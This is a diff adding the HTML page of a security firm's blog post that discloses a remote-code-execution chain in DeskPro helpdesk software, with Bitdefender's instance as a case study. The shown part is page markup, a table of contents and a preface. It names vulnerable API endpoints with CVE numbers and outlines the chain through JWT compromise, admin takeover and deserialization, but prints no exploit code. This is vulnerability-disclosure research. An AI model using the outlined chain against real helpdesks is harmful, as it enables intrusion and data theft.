@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en-US" itemscope itemtype="http://schema.org/Blog">
+<head>	
+	
+	<meta charset="UTF-8" />
+<title>Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study &#8211; Redforce </title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<link rel="alternate" type="application/rss+xml" title="Redforce  &raquo; Feed" href="https://blog.redforce.io/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Redforce  &raquo; Comments Feed" href="https://blog.redforce.io/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Redforce  &raquo; Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study Comments Feed" href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/feed/" />
+    
+		<meta property="og:title" content="Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study" />
+		<meta property="og:description" content="We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one." />
+		<meta property="og:url" content="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/" />
+						<meta property="og:image" content="https://blog.redforce.io/storage/2020/03/helpdesks_coverArtboard-1-150x150.jpg" />
+				<meta property="og:type" content="article" />
+		<meta property="og:site_name" content="Redforce " />
+			<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.redforce.io\/lib\/js\/wp-emoji-release.min.js"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<link rel='stylesheet' href='https://blog.redforce.io/lib/css/dashicons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/0f2c37ef13/vendor/codeinwp/icon-picker/css/types/elusive.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/0f2c37ef13/vendor/codeinwp/icon-picker/css/types/font-awesome.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/0f2c37ef13/vendor/codeinwp/icon-picker/css/types/foundation-icons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/0f2c37ef13/vendor/codeinwp/icon-picker/css/types/genericons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/0f2c37ef13/css/extra.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/lib/css/dist/block-library/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/a2174c3e6f/vendor/icomoon/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/a2174c3e6f/assets/css/screen.min.css' type='text/css' media='all' />
+<style type='text/css'>
+div#ez-toc-container p.ez-toc-title {font-size: 120%;}div#ez-toc-container p.ez-toc-title {font-weight: 500;}div#ez-toc-container ul li {font-size: 95%;}
+</style>
+<link rel='stylesheet' href='//fonts.googleapis.com/css?family=Montserrat:' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/views/10fdcdae3c/editor-style.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/views/10fdcdae3c/design.css' type='text/css' media='all' />
+<link rel='stylesheet' href='https://blog.redforce.io/core/views/6b989d9015/design.css' type='text/css' media='all' />
+<style type='text/css'>
+
+	/* Font */
+	html, body, input, textarea, select, button { font-family: 'Montserrat', sans-serif; }
+	
+	/* Background  */
+	body, #loadscreen { background-color: #f9faf9; }
+	#sidebar .widget { background-color: #ffffff; }
+	body.layout-list-1 .excerpt, body.layout-list-2 .excerpt .entry-header { background-color: #ffffff; }
+	
+	/* Logo */
+	#logo a { color: #ff2121; }
+	#logo img { height: 75px; }
+	
+	/* Links and Buttons */
+	p a, li a { background-image: linear-gradient(to bottom,#ff6363 50%,rgba(0,0,0,0) 50%); }
+	p a:hover, li a:hover, .tagcloud a:hover, a.accent { color: #ff6363; }
+	#menu ul.sub-menu li a:hover, #menu ul.children li a:hover { color: #ff6363; }
+	
+	input[type=submit], input[type=button], button, .button { background: linear-gradient(-30deg, #ff6363 0%, #ff0000 100%); }
+	
+	input[type=text]:hover, input[type=number]:hover, input[type=email]:hover, input[type=password]:hover,
+	input[type=text]:focus, input[type=number]:focus, input[type=email]:focus, input[type=password]:focus,
+	input[type=submit]:hover, input[type=button]:hover, button:hover, .button:hover,
+	input[type=submit]:focus, input[type=button]:focus, button:focus, .button:focus
+	{ border-color: #ff0000; }
+	
+	.like-heart.voted path, .entry-social a:hover path { fill: #ff6363; }
+	.entry-tags a:hover { background: #ff0000; }
+	.lazyload-wrapper::after { background: #ff6363; }
+	
+	/* Text */
+	body { color: #000000; }
+	
+	
+</style>
+<link rel='stylesheet' href='https://blog.redforce.io/core/modules/43342bc671/resources/EnlighterJS.min.css' type='text/css' media='all' />
+<script type='text/javascript' src='https://blog.redforce.io/lib/js/jquery/jquery.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/lib/js/jquery/jquery-migrate.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/1217de2d01/js/jquery.lazyloadxt.extra.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/1217de2d01/js/jquery.lazyloadxt.srcset.min.js'></script>
+
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.redforce.io/lib/wlwmanifest.xml" /> 
+<link rel='prev' title='Oh, My Kerberos! Do Not Get Kerberoasted!' href='https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/' />
+<link rel='next' title='Windows authentication attacks &#8211; part 1' href='https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/' />
+<link rel="canonical" href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/" />
+<link rel='shortlink' href='https://blog.redforce.io/?p=502' />
+<link rel="alternate" type="application/json+oembed" href="https://blog.redforce.io/api/oembed/1.0/embed?url=https%3A%2F%2Fblog.redforce.io%2Fattacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://blog.redforce.io/api/oembed/1.0/embed?url=https%3A%2F%2Fblog.redforce.io%2Fattacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study%2F&#038;format=xml" />
+<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><link rel="icon" href="https://blog.redforce.io/storage/2019/02/favicon-150x150.png" sizes="32x32" />
+<link rel="icon" href="https://blog.redforce.io/storage/2019/02/favicon.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://blog.redforce.io/storage/2019/02/favicon.png" />
+<meta name="msapplication-TileImage" content="https://blog.redforce.io/storage/2019/02/favicon.png" />
+		<style type="text/css">
+			#extras #searchbar { display: none; }
+#logo { margin-top: -15px; }
+.EnlighterJS {
+	width: auto;
+	overflow-x: auto;
+	word-wrap: normal;
+}
+
+ol.EnlighterJS,
+ul.EnlighterJS {
+	display: grid;
+	font-size: 0.8rem;
+}
+
+.EnlighterJS li {
+	white-space: pre;
+	font-size: 0.8rem;
+}
+.EnlighterJS span {font-size: 0.8rem;
+}
+article .entry-content { /*padding: 0 184px; font-size: 120%;*/font-size: 100%; position: relative; }
+		</style>
+		</head>
+
+<body class="wordpress ltr en en-us child-theme y2021 m10 d30 h16 saturday logged-out singular singular-post singular-post-502 layout-grid-1 loading full">
+
+<div id="loadscreen">
+</div>
+	
+<div id="wrapperbox">
+	
+
+	<header id="header">
+
+		
+		<h1 id="logo">
+							<a href="https://blog.redforce.io/" class="custom-logo-link" rel="home"><img width="1410" height="450" src="https://blog.redforce.io/storage/2019/02/logo_redforce.png" class="custom-logo" alt="Redforce " srcset="https://blog.redforce.io/storage/2019/02/logo_redforce.png 1410w, https://blog.redforce.io/storage/2019/02/logo_redforce-300x96.png 300w, https://blog.redforce.io/storage/2019/02/logo_redforce-768x245.png 768w, https://blog.redforce.io/storage/2019/02/logo_redforce-1024x327.png 1024w" sizes="(max-width: 1410px) 100vw, 1410px" /></a>						<span id="tagline">Always Stay Ahead!</span>
+		</h1>
+		
+		<div id="extras">
+			<form action="https://blog.redforce.io/" method="get" id="searchbar">
+	<fieldset>
+		<input type="text" name="s" value="" placeholder="Search" />
+		<button type="button"><svg width="19" height="19.3" viewBox="0 0 19 19.3"><circle stroke="#000" stroke-width="2" fill="none" cx="8.5" cy="8.5" r="7.5"/><path stroke-width="2" fill-rule="evenodd" d="M13 13.4a1 1 0 0 1 1.5 0l4.2 4.2a1 1 0 0 1-1.4 1.4L13 14.8a1 1 0 0 1 0-1.4z"/></svg></button>
+	</fieldset>
+</form>			
+		</div>
+				
+		
+		<nav id="menu">
+			<ul><li id="menu-item-403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-403"><a href="https://www.redforce.io/"><i class="_mi _before dashicons dashicons-admin-home" aria-hidden="true"></i><span>Home</span></a></li>
+<li id="menu-item-371" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-371"><a href="#"><i class="_mi _before dashicons dashicons-editor-ul" aria-hidden="true"></i><span>Categories</span></a>
+<ul class="sub-menu">
+	<li id="menu-item-375" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-375"><a href="https://blog.redforce.io/category/web-security/"><i class="_mi _before dashicons dashicons-admin-site" aria-hidden="true"></i><span>Web Security</span></a></li>
+	<li id="menu-item-443" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-443"><a href="https://blog.redforce.io/category/mobile-penetration-testing/"><i class="_mi _before dashicons dashicons-smartphone" aria-hidden="true"></i><span>Mobile pentest</span></a></li>
+</ul>
+</li>
+<li id="menu-item-359" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-359"><a href="https://www.redforce.io/about-us.html"><i class="_mi _before dashicons dashicons-welcome-view-site" aria-hidden="true"></i><span>About us</span></a>
+<ul class="sub-menu">
+	<li id="menu-item-360" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-360"><a href="https://www.redforce.io/about-us.html"><i class="_mi _before dashicons dashicons-admin-site" aria-hidden="true"></i><span>About us</span></a></li>
+	<li id="menu-item-361" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-361"><a href="https://www.redforce.io/our-team.html"><i class="_mi _before dashicons dashicons-welcome-learn-more" aria-hidden="true"></i><span>Our team</span></a></li>
+</ul>
+</li>
+<li id="menu-item-362" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-362"><a href="https://www.redforce.io/services.html"><i class="_mi _before dashicons dashicons-shield" aria-hidden="true"></i><span>Our services</span></a></li>
+</ul>		</nav>
+		
+		<div id="login-popup">
+			<a href="#" class="close"><svg width="14.7" height="14.7" viewBox="0 0 14.7 14.7"><path  d="M1.7.3L14.4 13a1 1 0 0 1-1.4 1.4L.3 1.7A1 1 0 1 1 1.7.3zm12.7 0a1 1 0 0 1 0 1.4L1.7 14.4A1 1 0 0 1 .3 13L13 .3a1 1 0 0 1 1.4 0z"/></svg></a>
+			
+			<h2>Get in!</h2>
+<p>Share stories that are meaningful to you<br />
+and connect with your audiences.</p>
+<p class="size-s">Click to sign in/sign up</p>
+			
+			 
+			
+		</div>
+	
+	</header>
+	
+<script>(function($) {
+ 
+jQuery( document ).ready(function() {
+    add_target_blank_to_external_links();
+});
+function add_target_blank_to_external_links(){
+    // This is the single line advertised in title ;) 
+    $('a[href^="http://"], a[href^="https://"]').not('a[href*="'+location.hostname+'"]').attr('target','_blank');
+}
+ 
+})(jQuery);</script>
+<script type="text/javascript">(function(t,e){var r=function(t){try{var r=e.head||e.getElementsByTagName("head")[0];a=e.createElement("script");a.setAttribute("type","text/javascript");a.setAttribute("src",t);r.appendChild(a);}catch(t){}};t.CollectId = "5c2fe9d4173f537e141b2010";r("https://collectcdn.com/launcher.js");})(window,document);</script>
+
+	<main id="content">
+		<div class="wrapper">
+	
+		
+		
+							<article id="post-502" class="entry author-0xsyndr0me has-excerpt post-502 post type-post status-publish format-standard has-post-thumbnail category-web-security tag-bugbounty tag-deskpro tag-helpdesk tag-information-security" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+
+		<div class="entry-header">
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/0xsyndr0me/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/web-security/" rel="category tag">Web Security</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">March 28, 2020</span> 
+				<a href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					15 min read				</a>
+			</div>
+						
+			
+			<h2>Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study</h2>
+			
+			
+			<div class="entry-excerpt">
+				<p>We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one.</p>
+			</div>
+			
+			
+			<div class="featured-image">
+							<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2020/03/helpdesks_coverArtboard-1-1040x464.jpg" alt="Attacking Helpdesks - Part 1: DeskPro" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2020/03/helpdesks_coverArtboard-1-1040x464.jpg" alt="Attacking Helpdesks - Part 1: DeskPro" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /></noscript>										</div>
+		</div>
+		
+		<div class="entry-content">
+			<div class="entry-social">
+			
+				<div class="like-heart" data-post_id="502">
+					<a href="javascript:void(0)">
+						<svg width="25" height="23" viewBox="0 0 25 23"><path d="M17.98.5a6.54 6.54 0 0 0-5.48 3 6.52 6.52 0 1 0-10.4 7.8.66.66 0 0 0 .04.06l10 11.08.1.06h.56l.1-.06 9.96-11.08a.3.3 0 0 0 .05-.07A6.52 6.52 0 0 0 18 .5zm4.12 10.2l-.04.05-9.55 10.6-9.56-10.6a.48.48 0 0 0-.04-.06 5.52 5.52 0 1 1 9.14-5.96.53.53 0 0 0 .9 0 5.52 5.52 0 1 1 9.16 5.95z"/></svg>
+						<span class="like-count">8</span>
+					</a>
+				</div>
+				
+				<div class="comment-count">
+					<a href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/#respond">
+						<svg width="24" height="22" viewBox="0 0 24 22"><path d="M3.66 22a.52.52 0 0 1-.5-.36.62.62 0 0 1 .13-.63 15.53 15.53 0 0 0 2.3-3.9C2.14 15.4 0 12.43 0 9.25 0 4.16 5.4 0 12 0s12 4.15 12 9.26-5.38 9.26-12 9.26c-.4 0-.8-.02-1.26-.06A9 9 0 0 1 3.66 22zM12 1.15c-6.04 0-10.95 3.64-10.95 8.1 0 2.86 2.08 5.53 5.43 7a.52.52 0 0 1 .3.3.66.66 0 0 1 0 .45 17.92 17.92 0 0 1-1.93 3.75 8.36 8.36 0 0 0 5.3-3.27.48.48 0 0 1 .42-.2c.55.06 1 .08 1.44.08 6.05 0 10.96-3.63 10.96-8.1s-4.9-8.1-10.96-8.1z"/></svg>
+						<span>0</span>
+					</a>
+				</div>
+				
+				<div class="twitter-share">
+					<a target="_blank" href="https://twitter.com/intent/tweet?text=Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study&url=https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/">
+						<svg width="19" height="16" viewBox="0 0 19 16"><path d="M6.47 15.5a11.68 11.68 0 0 1-5.8-1.66.4.4 0 0 1-.18-.47.38.38 0 0 1 .4-.27 6.86 6.86 0 0 0 4.13-.87 4.27 4.27 0 0 1-2.96-2.46.4.4 0 0 1 .06-.42.38.38 0 0 1 .4-.12 3.46 3.46 0 0 0 .54.1 4.05 4.05 0 0 1-2.1-3.52.4.4 0 0 1 .2-.35.37.37 0 0 1 .43.05 2.35 2.35 0 0 0 .4.26 4.33 4.33 0 0 1-.68-1.44 3.9 3.9 0 0 1 .43-3 .4.4 0 0 1 .3-.18.4.4 0 0 1 .34.14 9.2 9.2 0 0 0 6.48 3.55 3.96 3.96 0 0 1 1.7-3.64 3.9 3.9 0 0 1 4.93.38 8.35 8.35 0 0 0 1.9-.75.37.37 0 0 1 .44 0 .4.4 0 0 1 .16.43 3.62 3.62 0 0 1-.6 1.16 2.78 2.78 0 0 0 .5-.2.4.4 0 0 1 .46.1.4.4 0 0 1 .05.48 7.3 7.3 0 0 1-1.7 1.8 10.2 10.2 0 0 1-2.67 7.35 10 10 0 0 1-7.56 3.55zm-3.93-1.62a10.13 10.13 0 0 0 3.93.82 9.25 9.25 0 0 0 6.98-3.27 9.36 9.36 0 0 0 2.46-6.98.4.4 0 0 1 .18-.37 6.37 6.37 0 0 0 .86-.72 4.5 4.5 0 0 1-.85.12.38.38 0 0 1-.4-.33.4.4 0 0 1 .24-.44 2.32 2.32 0 0 0 .78-.68 6.6 6.6 0 0 1-1.27.38.4.4 0 0 1-.33-.1 3.16 3.16 0 0 0-4.15-.42 3.28 3.28 0 0 0-1.25 3.3.4.4 0 0 1-.08.34.37.37 0 0 1-.32.14 9.94 9.94 0 0 1-7.14-3.4 3.1 3.1 0 0 0-.1 1.86 3.16 3.16 0 0 0 1.25 1.85.4.4 0 0 1 .2.4.4.4 0 0 1-.32.33 2.1 2.1 0 0 1-.43.04 2.36 2.36 0 0 1-.93-.2 3.63 3.63 0 0 0 2.58 2.5.4.4 0 0 1 .2.7 2.03 2.03 0 0 1-1.43.4 3.6 3.6 0 0 0 2.88 1.43.4.4 0 0 1 .35.26.4.4 0 0 1-.1.43 6.97 6.97 0 0 1-3.8 1.62z"/></svg>
+						<span>Tweet</span>
+					</a>
+				</div>
+				
+				<div class="facebook-share">
+					<a target="_blank" href="https://www.facebook.com/dialog/feed?app_id=&display=popup&caption=Redforce :%20Always Stay Ahead!&description=We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one.&link=https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/&picture=https://blog.redforce.io/storage/2020/03/helpdesks_coverArtboard-1-1040x464.jpg&redirect_uri=https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/">
+						<svg width="19" height="19" viewBox="0 0 19 19"><path d="M16.85 18.5h-3.97a.38.38 0 0 1-.38-.38v-6.75a.38.38 0 0 1 .38-.37h2.2l.5-1.5h-2.7a.38.38 0 0 1-.38-.38V6.5c0-1.04 1.28-1.5 2.47-1.5h.53V3.5h-1.28C12.7 3.5 11 4.54 11 5.92v3.2a.38.38 0 0 1-.37.38H8V11h2.63a.38.38 0 0 1 .37.37v6.75a.38.38 0 0 1-.37.38H2.6a2.26 2.26 0 0 1-2.1-2.08V2.17A1.92 1.92 0 0 1 2.6.5h14.25a1.54 1.54 0 0 1 1.65 1.67v14.25a1.88 1.88 0 0 1-1.65 2.08zm-3.6-.75h3.6a1.2 1.2 0 0 0 .9-1.33V2.17a.8.8 0 0 0-.9-.92H2.6a1.2 1.2 0 0 0-1.35.92v14.25a1.54 1.54 0 0 0 1.35 1.33h7.65v-6H7.63a.38.38 0 0 1-.38-.38V9.12a.38.38 0 0 1 .38-.37h2.62V5.92c0-1.87 2.1-3.17 3.98-3.17h1.65a.38.38 0 0 1 .37.37v2.25a.38.38 0 0 1-.37.38h-.9c-.7 0-1.72.23-1.72.74v2.25h2.84a.38.38 0 0 1 .3.16.36.36 0 0 1 .06.34l-.75 2.25a.37.37 0 0 1-.35.25h-2.1v6z"/></svg>
+						<span>Share</span>
+					</a>
+				</div>
+			</div>
+			
+			<h1>TL;DR.<span class="ez-toc-section" id="TLDR"></span></h1><div id="ez-toc-container" class="ez-toc-v2_0_6 ez-toc-wrap-right counter-hierarchy counter-decimal ez-toc-transparent">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">Table of Contents</p>
+<span class="ez-toc-title-toggle"><a class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle"><i class="ez-toc-glyphicon ez-toc-icon-toggle"></i></a></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1"><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-1" href="#TLDR" title="TL;DR.">TL;DR.</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-2" href="#Preface" title="Preface">Preface</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-3" href="#About_DeskPro" title="About DeskPro">About DeskPro</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-4" href="#Vulnerability_Details" title="Vulnerability Details">Vulnerability Details</a><ul class="ez-toc-list-level-2"><li class="ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-5" href="#1_Insufficient_Access_Control_at_Multiple_API_endpoints" title="1. Insufficient Access Control at Multiple API endpoints">1. Insufficient Access Control at Multiple API endpoints</a><ul class="ez-toc-list-level-3"><li class="ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-6" href="#apiapps_CVE-2020-11465" title="/api/apps/*  &#8211; (CVE-2020-11465)">/api/apps/*  &#8211; (CVE-2020-11465)</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-7" href="#apiemail_accounts_CVE-2020-11463" title="/api/email_accounts &#8211; (CVE-2020-11463)">/api/email_accounts &#8211; (CVE-2020-11463)</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-8" href="#apitickets_CVE-2020-11466" title="/api/tickets &#8211; (CVE-2020-11466)">/api/tickets &#8211; (CVE-2020-11466)</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-9" href="#apipeople_CVE-2020-11464" title="/api/people &#8211; (CVE-2020-11464)">/api/people &#8211; (CVE-2020-11464)</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-10" href="#2_Insecure_Deserialization_to_RCE_in_Template_Editing_Feature_Needs_Admin_Privilege_CVE-2020-11467" title="2. Insecure Deserialization to RCE in Template Editing Feature (Needs Admin Privilege) [CVE-2020-11467]">2. Insecure Deserialization to RCE in Template Editing Feature (Needs Admin Privilege) [CVE-2020-11467]</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-11" href="#How_to_Identify_Passively" title="How to Identify Passively?">How to Identify Passively?</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-12" href="#Now_Time_for_Fun_Part_Exploitation" title="Now.. Time for Fun Part.. Exploitation!">Now.. Time for Fun Part.. Exploitation!</a><ul class="ez-toc-list-level-2"><li class="ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-13" href="#1_Retrieving_Limited_User_API_Token" title="1. Retrieving Limited User API Token">1. Retrieving Limited User API Token</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-14" href="#2_Compromising_JWT_Authentication" title="2. Compromising JWT Authentication">2. Compromising JWT Authentication</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-15" href="#3_Getting_Administrative_Access_to_Helpdesk" title="3. Getting Administrative Access to Helpdesk">3. Getting Administrative Access to Helpdesk</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-16" href="#4_Executing_Arbitrary_Code_on_Bitdefender_Helpdesk" title="4. Executing Arbitrary Code on Bitdefender Helpdesk">4. Executing Arbitrary Code on Bitdefender Helpdesk</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-17" href="#UPDATE" title="[UPDATE]">[UPDATE]</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-18" href="#Real_Impact" title="Real Impact">Real Impact</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-19" href="#Bitdefender_and_DeskPro_Response" title="Bitdefender and DeskPro Response">Bitdefender and DeskPro Response</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-20" href="#Whats_Next" title="What&#8217;s Next?">What&#8217;s Next?</a></li></ul></nav></div>
+
+<p>We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one.</p>
+<h1>Preface<span class="ez-toc-section" id="Preface"></span></h1>
+<p>A helpdesk is now a crucial part of any company’s online presence. With much sensitive information exchanged between agents and clients, it makes it the perfect target for an adversary targeting the organization.</p>
+<p>In September 2019, we decided to have a look at some of the most popular open-source helpdesk solutions. Between cloud and on-premise, we preferred to focus on self-hosted solutions because the risks accompanied with them extend beyond data breach to potential internal network infiltration. So, we chose on-prem versions of <strong>DeskPro</strong>, <strong>osTicket</strong> and <strong>Kayako</strong> (We also did “PHP Live!” as a plus for a client) and will present our principal findings in this and the upcoming articles.</p>
+<h1>About DeskPro<span class="ez-toc-section" id="About_DeskPro"></span></h1>
+<p>As defined by them</p>
+<blockquote><p>Deskpro is a helpdesk software solution that helps companies manage their communication with their customers and user base across a multiple channels; email, live chat, voice, social media</p></blockquote>
